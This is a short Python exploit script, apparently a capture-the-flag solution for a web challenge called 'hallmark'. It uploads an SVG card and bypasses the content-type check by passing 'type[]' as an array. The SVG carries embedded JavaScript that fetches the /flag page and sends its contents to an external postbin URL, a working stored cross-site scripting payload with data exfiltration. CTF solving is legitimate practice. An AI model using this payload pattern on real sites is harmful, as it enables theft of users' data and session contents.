import requests

base_url = "https://hallmark.web.actf.co"
id = "ceea0b77-a47f-430f-a3be-d5202243bddd"

payload = """<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
   <script>
   fetch("/flag")
   .then(response => response.text())
   .then(flag => fetch(`https://www.toptal.com/developers/postbin/1682775742995-4958162251859?flag=${flag}`))
   </script>
</svg>"""


def update_svg() -> None:
    data = {
        "id": id,
        "type[]": "image/svg+xml",
        "content": payload
    }
    result = requests.put(f"{base_url}/card", data=data)
    print(result.text)


if __name__ == "__main__":
    update_svg()
